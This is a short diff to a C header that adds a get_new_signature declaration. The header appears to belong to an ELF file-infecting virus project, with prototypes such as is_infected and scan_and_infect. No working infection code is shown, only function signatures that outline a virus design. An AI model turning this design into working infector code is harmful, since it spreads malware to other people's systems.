@@ -47,6 +47,7 @@ int parse_elf(const char *filename, t_elf *elf);
 void cleanup_elf(t_elf *elf);
 Elf64_Shdr *find_section(t_elf *elf, const char *name);
 const char *get_signature(void);
+const char *get_new_signature(void);
 bool is_infected(t_elf *elf);
 void scan_and_infect(const char *dir1, const char *dir2);
 void scan_directory(const char *dir_path);
